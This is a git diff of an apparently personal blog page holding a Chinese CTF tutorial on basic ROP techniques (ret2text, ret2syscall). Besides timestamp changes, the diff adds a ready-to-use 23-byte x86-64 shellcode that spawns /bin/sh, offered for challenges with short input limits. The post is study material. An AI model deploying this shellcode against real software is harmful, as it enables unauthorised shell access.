@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240709170801.jpg">
 <meta property="article:published_time" content="2024-03-19T12:52:40.000Z">
-<meta property="article:modified_time" content="2024-04-08T12:30:50.075Z">
+<meta property="article:modified_time" content="2024-07-23T13:43:07.571Z">
 <meta property="article:author" content="GNchen1">
 <meta property="article:tag" content="ROP">
 <meta name="twitter:card" content="summary">
@@ -56,7 +56,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-04-08 20:30:50'
+  postUpdate: '2024-07-23 21:43:07'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -160,7 +160,7 @@
 document.addEventListener('pjax:send', () => {
   Pace.restart()
 })
-</script><link rel="stylesheet" href="https://raw.githubusercontent.com/C17zz/Pages/main/Img/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240709170756.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240709170801.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Chen's Blog"><span class="site-name">Chen's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基本ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-19T12:52:40.000Z" title="Created 2024-03-19 20:52:40">2024-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-04-08T12:30:50.075Z" title="Updated 2024-04-08 20:30:50">2024-04-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="基本ROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><em>仅供个人学习参考</em>  </p>
+</script><link rel="stylesheet" href="https://raw.githubusercontent.com/C17zz/Pages/main/Img/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240709170756.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240709170801.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Chen's Blog"><span class="site-name">Chen's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基本ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-19T12:52:40.000Z" title="Created 2024-03-19 20:52:40">2024-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-23T13:43:07.571Z" title="Updated 2024-07-23 21:43:07">2024-07-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="基本ROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><em>仅供个人学习参考</em>  </p>
 <span id="more"></span>
 
 <h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><em>有后门就是爽</em></p>
@@ -176,6 +176,9 @@ document.addEventListener('pjax:send', () => {
 
 <p>若文件是64位的，需要加个：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目可输入的字长不够时，可以试试这个shellcode，只有23字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode：<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><em>简单的一次代码碎片利用</em><br><em>“震惊！！小小碎片竟然能够……”</em></p>
 <p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreihl4i3gaqkwx2z4spiu3lrtpx2btts3k7dhqzh7as5ymswb4krwue" alt="1"><br>开启了nx保护<br>再用ida看看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibbq5j2yegjl7gu4xxy4pcmg73w67ygpffvyd4b4ltg2yk73qh3wq" alt="2"><br>存在栈溢出，且有字符串“&#x2F;bin&#x2F;sh”，但是经过查找发现有可利用的代码片段，于是采用rop的思路，通过系统调用获取shell</p>
